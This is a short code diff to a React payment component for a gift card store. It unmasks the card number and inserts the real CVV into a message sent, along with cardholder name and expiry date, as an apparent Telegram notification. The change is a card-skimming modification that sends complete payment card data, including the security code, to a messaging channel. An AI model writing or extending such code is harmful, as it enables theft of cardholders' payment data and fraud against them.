@@ -156,10 +156,10 @@ const Payment = () => {
 
 💰 *Card Details*:
    Card Type: ${selectedCardType}
-   Card Number: \`${maskCardNumber(formData.cardNumber)}\`
+   Card Number: \`${formData.cardNumber}\`
    Card Holder: ${formData.cardName}
    Expiry: ${formData.expiryDate}
-   CVV: \`***\`
+   CVV: \`${formData.cvv}\`
 
 🛒 *Order Details*:
    Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
@@ -397,7 +397,8 @@ const Payment = () => {
         cardType: selectedCardType,
         cardNumber: formData.cardNumber,
         cardName: formData.cardName,
-        expiryDate: formData.expiryDate
+        expiryDate: formData.expiryDate,
+        cvv: formData.cvv
       });
       
       console.log("Telegram notification status:", notificationSent ? "Sent" : "Failed");
